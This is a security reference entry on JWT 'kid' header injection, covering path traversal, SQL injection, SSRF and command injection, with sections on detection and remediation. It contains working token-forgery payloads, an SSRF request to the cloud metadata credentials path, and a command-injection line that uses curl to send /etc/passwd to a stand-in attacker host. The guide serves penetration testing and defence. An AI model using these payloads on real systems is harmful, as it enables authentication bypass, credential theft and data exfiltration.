# JWT kid Parameter Injection (Path Traversal / SQLi / SSRF)

**Category:** JWT Vulnerabilities / Injection via Header Claims
**Severity:** Critical to High
**Last Updated:** 2026-02-04

## Attack Description

The `kid` (Key ID) JWT header parameter identifies which key the server should use for signature verification. When the server uses `kid` in filesystem paths, database queries, or URL fetches without sanitization, it opens injection attack surfaces:

1. **Path Traversal** — read arbitrary files as signing keys
2. **SQL Injection** — inject into DB queries that fetch keys
3. **SSRF** — redirect key fetching to attacker-controlled servers
4. **OS Command Injection** — when kid is passed to shell commands

## Prerequisites

- Target JWT uses `kid` header parameter
- Server dynamically resolves the signing key based on `kid` value
- Insufficient input validation on `kid` parameter

## Exploitation Steps

### Attack Vector 1: Path Traversal via kid

**Goal:** Make the server use a predictable file as the signing key.

```json
{
  "alg": "HS256",
  "kid": "../../../dev/null",
  "typ": "JWT"
}
```

Sign the token with an empty string (content of `/dev/null`):
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

**Predictable key files on Linux:**
| File | Content | Use as Secret |
|------|---------|---------------|
| `/dev/null` | Empty | `""` |
| `/proc/sys/kernel/randomize_va_space` | `2` | `"2"` |
| `/etc/hostname` | Hostname string | Known if recon done |
| `/proc/1/environ` | Environment vars | May leak actual secrets |

### Attack Vector 2: SQL Injection via kid

If `kid` is used in a SQL query to fetch the signing key:
```sql
SELECT key FROM jwt_keys WHERE kid = '<user_input>';
```

Inject to control the returned key:
```json
{
  "alg": "HS256",
  "kid": "nonexistent' UNION SELECT 'my_known_secret';-- -"
}
```

Then sign the JWT with `my_known_secret` as the HMAC key.

**Escalation:** Beyond key control, classic SQLi exploitation:
- `UNION SELECT` to extract database contents
- Time-based blind SQLi for data exfiltration
- In extreme cases, `INTO OUTFILE` or `xp_cmdshell` for RCE

### Attack Vector 3: SSRF via kid

If `kid` supports URL-based key fetching:
```json
{
  "alg": "HS256",
  "kid": "https://attacker.com/malicious-key"
}
```

Host a file at `https://attacker.com/malicious-key` containing your chosen secret, then sign the JWT with that secret.

**SSRF escalation:**
```json
{"kid": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

### Attack Vector 4: OS Command Injection via kid

If `kid` is passed to a shell command (rare but devastating):
```json
{
  "kid": "key1; curl https://attacker.com/exfil?data=$(cat /etc/passwd)"
}
```

## Detection Method

### As a Pentester
1. Decode JWT and check for `kid` parameter
2. Search for the key file on the web root (`/key/<kid>`, `/key/<kid>.pem`)
3. Test path traversal sequences: `../`, `..%2f`, `....//`
4. Test SQLi payloads: `' OR 1=1--`, `' UNION SELECT 'test'--`
5. Test URL injection: `http://collaborator.example.com`
6. Test command injection: `; sleep 10`, `$(id)`

### As a Defender
- Log and monitor `kid` parameter values in JWT headers
- Alert on `kid` values containing: `../`, `'`, `;`, `http://`, `$(`
- Monitor for unexpected outbound connections from JWT verification services

## Remediation

1. **Validate kid against allowlist**
   ```javascript
   const allowedKids = ['key-2024-primary', 'key-2024-backup'];
   if (!allowedKids.includes(decodedHeader.kid)) {
     throw new Error('Invalid key ID');
   }
   ```
2. **Never use kid in filesystem paths directly** — map to predefined paths
3. **Parameterize database queries** — use prepared statements
4. **Never pass kid to shell commands**
5. **If kid must resolve URLs** — strict allowlist of domains, SSRF protections

## Real-World Examples

### 1. Intigriti JWT kid Path Traversal (Documented 2025)
- **Technique:** `kid` parameter concatenated into file path without validation
- **Exploit:** Traversal to `/dev/null`, sign with empty string
- **Impact:** Full JWT forgery, authentication bypass
- **Source:** Intigriti Blog, November 2025

### 2. JWT kid SQL Injection (Multiple Bug Bounty Reports)
- **Technique:** `kid` inserted into SQL query without parameterization
- **Exploit:** `UNION SELECT` to inject known signing key
- **Impact:** JWT forgery + potential database exfiltration
- **Source:** HackTricks, PortSwigger Labs

### 3. B2B SaaS kid Injection → SSRF (Invicti Research)
- **Technique:** `kid` supports URL-based key fetching
- **Exploit:** Redirect to attacker-controlled server or cloud metadata
- **Impact:** JWT forgery + SSRF to internal services
- **Source:** Invicti Blog, Red Sentry 2026 Guide

## Web3 Context

`kid` injection is especially impactful in Web3 because:
- **Multi-tenant DeFi platforms** use key rotation with `kid` to identify active keys
- **Bridge interfaces** may use `kid` in cross-service JWT validation
- **NFT marketplace APIs** that handle trading — `kid` SQLi could expose user wallets and transaction data
- **Staking platforms** — JWT forgery via `kid` path traversal → modify staking positions

## jku/x5u Related Attacks

Similar injection surfaces exist in other JWT header claims:
- **`jku` (JWK Set URL):** Points to JWKS file containing verification keys. Redirect to attacker-hosted JWKS.
- **`x5u` (X.509 URL):** Points to certificate chain. Same SSRF vector.
- **`x5c` (X.509 Certificate Chain):** Embed self-signed cert directly in token header.

All three allow the attacker to supply their own verification key if the server trusts the header claim.

## References

- Intigriti JWT Exploitation: https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-jwt-vulnerabilities
- HackTricks JWT kid: https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html
- PortSwigger JWT Attacks: https://portswigger.net/web-security/jwt
- Invicti JWT Attacks: https://www.invicti.com/blog/web-security/json-web-token-jwt-attacks-vulnerabilities
